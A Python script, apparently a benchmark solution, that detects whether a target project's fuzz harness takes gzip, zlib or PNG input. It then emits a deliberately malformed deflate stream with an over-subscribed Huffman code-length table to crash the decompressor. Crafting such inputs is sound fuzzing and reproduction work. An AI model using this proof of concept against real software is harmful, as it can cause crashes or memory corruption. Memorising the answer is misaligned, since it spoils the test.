import os
import io
import tarfile
import struct
import zlib
from typing import Iterator, Tuple


class _BitWriter:
    __slots__ = ("buf", "cur", "nbits")

    def __init__(self):
        self.buf = bytearray()
        self.cur = 0
        self.nbits = 0

    def write_bits(self, value: int, n: int) -> None:
        for i in range(n):
            bit = (value >> i) & 1
            self.cur |= (bit << self.nbits)
            self.nbits += 1
            if self.nbits == 8:
                self.buf.append(self.cur & 0xFF)
                self.cur = 0
                self.nbits = 0

    def finish(self) -> bytes:
        if self.nbits:
            self.buf.append(self.cur & 0xFF)
            self.cur = 0
            self.nbits = 0
        return bytes(self.buf)


def _iter_src_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                name = os.path.join(root, fn)
                rel = os.path.relpath(name, src_path)
                lrel = rel.lower()
                if not (lrel.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".in", ".txt", ".md", ".rst"))):
                    continue
                try:
                    with open(name, "rb") as f:
                        yield rel, f.read(256 * 1024)
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if not m.isreg():
                    continue
                lnm = (m.name or "").lower()
                if not (lnm.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".in", ".txt", ".md", ".rst"))):
                    continue
                if m.size <= 0:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(256 * 1024)
                    yield m.name, data
                except Exception:
                    continue
    except Exception:
        return


def _detect_format(src_path: str) -> str:
    gzip_score = 0
    zlib_score = 0
    png_score = 0

    for name, data in _iter_src_files(src_path):
        lname = name.lower()

        if "upng" in lname or "png" in lname:
            png_score += 2
        if "gzip" in lname or "gunzip" in lname:
            gzip_score += 4
        if "zlib" in lname:
            zlib_score += 3

        try:
            txt = data.decode("latin1", "ignore").lower()
        except Exception:
            continue

        if "llvmfuzzertestoneinput" in txt:
            if "upng" in txt or "idat" in txt or "ihdr" in txt:
                png_score += 8
            if "gzip" in txt or "gunzip" in txt:
                gzip_score += 8
            if "zlib" in txt or "adler32" in txt:
                zlib_score += 6

        if "ihdr" in txt and "idat" in txt and "iend" in txt:
            png_score += 7
        elif "png" in txt and "idat" in txt:
            png_score += 4

        if "gzip" in txt:
            gzip_score += 3
        if "gunzip" in txt:
            gzip_score += 3
        if "id1" in txt and "id2" in txt:
            gzip_score += 2
        if "isize" in txt:
            gzip_score += 2
        if ("0x1f" in txt and "0x8b" in txt) or ("1f 8b" in txt):
            gzip_score += 6

        if "adler32" in txt:
            zlib_score += 6
        if ("cmf" in txt and "flg" in txt) or ("fdict" in txt):
            zlib_score += 4
        if "zlib" in txt:
            zlib_score += 3

    if png_score >= 14 and png_score >= gzip_score + 5 and png_score >= zlib_score + 5:
        return "png"
    if gzip_score >= 8 and gzip_score >= zlib_score + 3:
        return "gzip"
    if zlib_score >= 8 and zlib_score >= gzip_score + 3:
        return "zlib"
    if gzip_score > 0 and zlib_score == 0:
        return "gzip"
    if zlib_score > 0 and gzip_score == 0:
        return "zlib"
    return "gzip"


def _make_deflate_dynamic_hclen16() -> bytes:
    bw = _BitWriter()
    bw.write_bits(1, 1)   # BFINAL = 1
    bw.write_bits(2, 2)   # BTYPE = 2 (dynamic)

    bw.write_bits(0, 5)   # HLIT = 257
    bw.write_bits(0, 5)   # HDIST = 1
    bw.write_bits(12, 4)  # HCLEN = 16 (HCLEN+4)

    for _ in range(16):
        bw.write_bits(1, 3)

    out = bytearray(bw.finish())
    if len(out) < 9:
        out.extend(b"\x00" * (9 - len(out)))
    elif len(out) > 9:
        out = out[:9]
    return bytes(out)


def _wrap_gzip(deflate_data: bytes) -> bytes:
    hdr = bytes([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF])
    trailer = struct.pack("<II", 0, 0)  # CRC32=0 for empty, ISIZE=0
    return hdr + deflate_data + trailer


def _wrap_zlib(deflate_data: bytes) -> bytes:
    zhdr = b"\x78\x9c"
    adler = struct.pack(">I", 1)  # Adler32 of empty
    return zhdr + deflate_data + adler


def _make_png_with_idat(zlib_stream: bytes) -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"

    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    ihdr = struct.pack(">I", len(ihdr_data)) + b"IHDR" + ihdr_data
    ihdr_crc = struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
    ihdr_chunk = ihdr + ihdr_crc

    idat_data = zlib_stream
    idat = struct.pack(">I", len(idat_data)) + b"IDAT" + idat_data
    idat_crc = struct.pack(">I", zlib.crc32(b"IDAT" + idat_data) & 0xFFFFFFFF)
    idat_chunk = idat + idat_crc

    iend = struct.pack(">I", 0) + b"IEND"
    iend_crc = struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    iend_chunk = iend + iend_crc

    return sig + ihdr_chunk + idat_chunk + iend_chunk


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format(src_path)
        deflate_data = _make_deflate_dynamic_hclen16()

        if fmt == "png":
            return _make_png_with_idat(_wrap_zlib(deflate_data))
        if fmt == "zlib":
            return _wrap_zlib(deflate_data)
        if fmt == "raw":
            return deflate_data
        return _wrap_gzip(deflate_data)